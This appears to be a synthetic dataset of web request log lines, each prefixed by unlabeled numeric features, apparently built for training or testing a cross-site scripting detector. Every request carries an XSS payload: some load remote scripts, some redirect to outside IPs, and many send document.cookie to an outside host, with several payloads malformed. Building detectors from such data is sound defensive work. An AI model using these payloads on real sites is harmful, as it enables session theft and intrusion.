83,1,200,4525,7,31,17,6,2,GET /?file=<script><script+src="http://189.217.252.58/998828.js=></script> HTTP/1.1
101,1,200,6280,7,54,19,6,2,GET /?name=<script>window.location='http://53.175.192.155/?cookie='+document.cookie</script> HTTP/1.1
99,1,200,5048,7,51,19,6,2,GET /?p=<script>window.location='http://169.111.181.133/?cookie='+document.cookie</script> HTTP/1.1
84,1,200,7272,8,32,16,6,2,GET /?search=<script>%window.open('http://179.43.242.232/254996')3C/script> HTTP/1.1
82,1,200,2182,8,30,16,6,2,GET /?file=<script>%window.open('http://134.69.107.176/306742')3C/script> HTTP/1.1
78,1,200,2584,7,35,14,5,2,GET /?p=<script>window.location.href="http://231.232.14.104"</script> HTTP/1.1
102,1,200,4863,7,56,19,6,2,GET /?search=<script>window.location='http://175.60.21.196/?cookie='+document.cookie</script> HTTP/1.1
101,1,200,4847,7,54,19,6,2,GET /?name=<script>window.location='http://105.60.237.243/?cookie='+document.cookie</script> HTTP/1.1
83,1,200,2647,7,31,17,6,2,GET /?name=<script><script+src="http://185.84.102.111/813333.js=></script> HTTP/1.1
82,1,200,5865,7,33,17,6,2,GET /?search=<script><script+src="http://48.16.8.182/471219.js=></script> HTTP/1.1
79,1,200,7883,7,38,14,5,2,GET /?file=<script>window.location.href="http://77.35.229.10"</script> HTTP/1.1
83,1,200,6132,7,33,17,6,2,GET /?search=<script><script+src="http://35.245.218.2/838777.js=></script> HTTP/1.1
82,1,200,7263,7,38,14,5,2,GET /?name=<script>window.location.href="http://192.171.183.112"</script> HTTP/1.1
77,1,200,1263,8,27,16,6,2,GET /?p=<script>%window.open('http://2.228.24.184/308227')3C/script> HTTP/1.1
82,1,200,5608,7,31,17,6,2,GET /?name=<script><script+src="http://70.81.102.185/816485.js=></script> HTTP/1.1
82,1,200,1846,7,33,17,6,2,GET /?search=<script><script+src="http://42.5.111.45/305268.js=></script> HTTP/1.1
81,1,200,7646,8,30,16,6,2,GET /?name=<script>%window.open('http://58.60.106.193/864964')3C/script> HTTP/1.1
80,1,200,4198,7,28,17,6,2,GET /?p=<script><script+src="http://211.160.169.64/855135.js=></script> HTTP/1.1
83,1,200,6972,7,31,17,6,2,GET /?name=<script><script+src="http://135.26.207.146/167917.js=></script> HTTP/1.1
101,1,200,7494,7,56,19,6,2,GET /?search=<script>window.location='http://3.35.143.173/?cookie='+document.cookie</script> HTTP/1.1
82,1,200,4248,7,40,14,5,2,GET /?search=<script>window.location.href="http://153.48.219.68"</script> HTTP/1.1
81,1,200,5092,7,31,17,6,2,GET /?name=<script><script+src="http://212.4.110.40/239072.js=></script> HTTP/1.1
85,1,200,1470,7,33,17,6,2,GET /?search=<script><script+src="http://64.164.163.233/940382.js=></script> HTTP/1.1
80,1,200,4221,7,28,17,6,2,GET /?p=<script><script+src="http://167.242.40.234/217579.js=></script> HTTP/1.1
85,1,200,1318,7,33,17,6,2,GET /?search=<script><script+src="http://230.100.251.66/342327.js=></script> HTTP/1.1
100,1,200,6368,7,54,19,6,2,GET /?name=<script>window.location='http://63.95.190.185/?cookie='+document.cookie</script> HTTP/1.1
81,1,200,1716,8,30,16,6,2,GET /?name=<script>%window.open('http://106.95.106.76/358777')3C/script> HTTP/1.1
104,1,200,2956,7,56,19,6,2,GET /?search=<script>window.location='http://202.225.170.148/?cookie='+document.cookie</script> HTTP/1.1
97,1,200,3484,7,51,19,6,2,GET /?p=<script>window.location='http://38.241.76.110/?cookie='+document.cookie</script> HTTP/1.1
82,1,200,1879,7,31,17,6,2,GET /?file=<script><script+src="http://126.135.31.60/411874.js=></script> HTTP/1.1
81,1,200,2775,8,30,16,6,2,GET /?file=<script>%window.open('http://100.57.57.189/655347')3C/script> HTTP/1.1
80,1,200,4325,7,28,17,6,2,GET /?p=<script><script+src="http://144.233.144.23/518446.js=></script> HTTP/1.1
77,1,200,1819,7,35,14,5,2,GET /?p=<script>window.location.href="http://139.31.31.107"</script> HTTP/1.1
77,1,200,5820,7,35,14,5,2,GET /?p=<script>window.location.href="http://43.174.76.228"</script> HTTP/1.1
83,1,200,1394,7,40,14,5,2,GET /?search=<script>window.location.href="http://113.48.105.207"</script> HTTP/1.1
101,1,200,7652,7,54,19,6,2,GET /?file=<script>window.location='http://246.203.52.188/?cookie='+document.cookie</script> HTTP/1.1
82,1,200,2575,7,31,17,6,2,GET /?name=<script><script+src="http://250.46.50.112/137046.js=></script> HTTP/1.1
80,1,200,6160,8,27,16,6,2,GET /?p=<script>%window.open('http://239.176.231.140/211502')3C/script> HTTP/1.1
80,1,200,7208,7,38,14,5,2,GET /?file=<script>window.location.href="http://241.0.161.227"</script> HTTP/1.1
81,1,200,5902,8,30,16,6,2,GET /?file=<script>%window.open('http://251.222.41.38/832886')3C/script> HTTP/1.1
83,1,200,2343,7,31,17,6,2,GET /?name=<script><script+src="http://180.57.253.240/765744.js=></script> HTTP/1.1
80,1,200,4263,8,30,16,6,2,GET /?file=<script>%window.open('http://212.30.70.64/102537')3C/script> HTTP/1.1
81,1,200,2072,7,28,17,6,2,GET /?p=<script><script+src="http://105.198.202.197/907088.js=></script> HTTP/1.1
81,1,200,1278,7,31,17,6,2,GET /?name=<script><script+src="http://34.201.66.63/831653.js=></script> HTTP/1.1
98,1,200,5037,7,51,19,6,2,GET /?p=<script>window.location='http://11.179.232.221/?cookie='+document.cookie</script> HTTP/1.1
77,1,200,3567,7,35,14,5,2,GET /?p=<script>window.location.href="http://167.5.191.225"</script> HTTP/1.1
81,1,200,3276,8,30,16,6,2,GET /?name=<script>%window.open('http://83.141.123.32/432119')3C/script> HTTP/1.1
81,1,200,3995,7,31,17,6,2,GET /?name=<script><script+src="http://166.86.195.73/15715.js=></script> HTTP/1.1
104,1,200,4174,7,56,19,6,2,GET /?search=<script>window.location='http://129.196.193.131/?cookie='+document.cookie</script> HTTP/1.1
100,1,200,6670,7,54,19,6,2,GET /?file=<script>window.location='http://149.11.71.233/?cookie='+document.cookie</script> HTTP/1.1
103,1,200,7340,7,56,19,6,2,GET /?search=<script>window.location='http://66.123.125.160/?cookie='+document.cookie</script> HTTP/1.1
81,1,200,1341,8,30,16,6,2,GET /?name=<script>%window.open('http://178.207.59.66/633928')3C/script> HTTP/1.1
78,1,200,2372,7,28,17,6,2,GET /?p=<script><script+src="http://190.69.46.49/107683.js=></script> HTTP/1.1
86,1,200,6300,7,33,17,6,2,GET /?search=<script><script+src="http://237.149.223.202/813772.js=></script> HTTP/1.1
100,1,200,3558,7,54,19,6,2,GET /?file=<script>window.location='http://33.180.77.158/?cookie='+document.cookie</script> HTTP/1.1
78,1,200,3841,7,35,14,5,2,GET /?p=<script>window.location.href="http://162.187.45.160"</script> HTTP/1.1
77,1,200,4050,7,35,14,5,2,GET /?p=<script>window.location.href="http://171.113.85.12"</script> HTTP/1.1
84,1,200,2611,7,31,17,6,2,GET /?name=<script><script+src="http://175.107.229.237/514085.js=></script> HTTP/1.1
83,1,200,6581,7,33,17,6,2,GET /?search=<script><script+src="http://83.58.105.81/965850.js=></script> HTTP/1.1
80,1,200,2186,7,38,14,5,2,GET /?name=<script>window.location.href="http://62.125.60.216"</script> HTTP/1.1
78,1,200,6439,8,27,16,6,2,GET /?p=<script>%window.open('http://23.215.195.64/400236')3C/script> HTTP/1.1
100,1,200,2063,7,54,19,6,2,GET /?file=<script>window.location='http://204.91.116.62/?cookie='+document.cookie</script> HTTP/1.1
78,1,200,6425,7,35,14,5,2,GET /?p=<script>window.location.href="http://26.238.208.176"</script> HTTP/1.1
83,1,200,4935,7,33,17,6,2,GET /?search=<script><script+src="http://54.250.32.72/840089.js=></script> HTTP/1.1
77,1,200,4507,7,35,14,5,2,GET /?p=<script>window.location.href="http://152.54.92.187"</script> HTTP/1.1
77,1,200,6041,7,35,14,5,2,GET /?p=<script>window.location.href="http://72.215.69.236"</script> HTTP/1.1
96,1,200,5833,7,51,19,6,2,GET /?p=<script>window.location='http://53.12.30.193/?cookie='+document.cookie</script> HTTP/1.1
98,1,200,2746,7,54,19,6,2,GET /?file=<script>window.location='http://62.1.86.237/?cookie='+document.cookie</script> HTTP/1.1
81,1,200,3850,7,38,14,5,2,GET /?name=<script>window.location.href="http://217.70.142.234"</script> HTTP/1.1
83,1,200,2218,7,40,14,5,2,GET /?search=<script>window.location.href="http://164.162.142.66"</script> HTTP/1.1
85,1,200,3504,7,33,17,6,2,GET /?search=<script><script+src="http://198.187.124.95/852624.js=></script> HTTP/1.1
83,1,200,7552,7,40,14,5,2,GET /?search=<script>window.location.href="http://48.254.166.156"</script> HTTP/1.1
80,1,200,4570,7,40,14,5,2,GET /?search=<script>window.location.href="http://6.71.59.146"</script> HTTP/1.1
83,1,200,1019,7,40,14,5,2,GET /?search=<script>window.location.href="http://236.246.104.40"</script> HTTP/1.1
102,1,200,5146,7,54,19,6,2,GET /?name=<script>window.location='http://206.103.171.174/?cookie='+document.cookie</script> HTTP/1.1
100,1,200,4814,7,54,19,6,2,GET /?name=<script>window.location='http://167.131.69.81/?cookie='+document.cookie</script> HTTP/1.1
104,1,200,4163,7,56,19,6,2,GET /?search=<script>window.location='http://204.206.214.182/?cookie='+document.cookie</script> HTTP/1.1
99,1,200,1280,7,54,19,6,2,GET /?name=<script>window.location='http://251.19.7.129/?cookie='+document.cookie</script> HTTP/1.1
85,1,200,2489,8,32,16,6,2,GET /?search=<script>%window.open('http://223.184.143.239/734308')3C/script> HTTP/1.1
78,1,200,5284,7,35,14,5,2,GET /?p=<script>window.location.href="http://191.201.99.186"</script> HTTP/1.1
101,1,200,4484,7,54,19,6,2,GET /?file=<script>window.location='http://225.55.206.152/?cookie='+document.cookie</script> HTTP/1.1
76,1,200,5147,7,35,14,5,2,GET /?p=<script>window.location.href="http://86.23.199.42"</script> HTTP/1.1
78,1,200,1186,7,35,14,5,2,GET /?p=<script>window.location.href="http://196.205.91.147"</script> HTTP/1.1
